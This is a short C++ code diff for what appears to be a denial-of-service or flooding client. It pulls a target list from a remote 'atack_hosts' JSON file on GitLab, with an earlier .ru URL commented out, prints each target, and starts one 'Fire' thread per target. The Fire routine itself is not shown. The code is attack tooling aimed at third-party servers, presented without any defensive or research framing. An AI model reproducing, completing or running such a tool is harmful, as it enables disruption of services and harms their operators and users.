@@ -14,7 +14,9 @@
 __asm__(".symver realpath,realpath@GLIBC_2.33");
 
 extern constexpr const char *API_STRING = "/api.php";
-extern constexpr const char *APIS_LIST = "http://rockstarbloggers.ru/hosts.json";
+//extern constexpr const char *APIS_LIST = "http://rockstarbloggers.ru/hosts.json";
+extern constexpr const char *APIS_LIST = "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json";
+#define _THREADS_COUNT 	(1)
 
 std::atomic<bool> g_shouldStop{false};
 
@@ -61,14 +63,15 @@ int main(int argc, char **argv)
 	for(auto uri : hostsData)
 	{
 		apis.push_back(uri);
+		std::cout << "API: " << uri << std::endl;
 	}
 	std::cout << "Succesfully got APIs" << std::endl;
 
 	std::vector<std::thread> pool;
 
-	for(size_t i = 0; i < std::thread::hardware_concurrency(); i++)
+	for(size_t i = 0; i < apis.size(); i++)
 	{
-		pool.push_back(std::thread(Fire, apis, std::ref(g_shouldStop)));
+		pool.push_back(std::thread(Fire, apis[i], std::ref(g_shouldStop)));
 	}
 
 	for(auto &thread : pool)
